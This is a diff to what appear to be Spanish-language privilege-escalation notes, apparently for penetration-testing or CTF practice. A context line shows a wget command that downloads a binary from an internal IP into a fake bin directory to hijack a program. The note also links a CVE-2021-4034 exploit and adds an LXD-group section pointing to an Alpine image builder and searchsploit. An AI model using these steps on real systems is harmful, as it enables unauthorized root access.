@@ -31,3 +31,11 @@ mkdir -p ~/fakebin && wget -q http://10.10.xx.xx/megacli -O ~/fakebin/megacli &&
 ```bash
 https://github.com/rvizx/CVE-2021-4034
 ```
+
+## LXD GROUP
+
+```bash
+#Subes el gz:
+https://github.com/saghul/lxd-alpine-builder
+#Usar el searchsploit que hay
+```
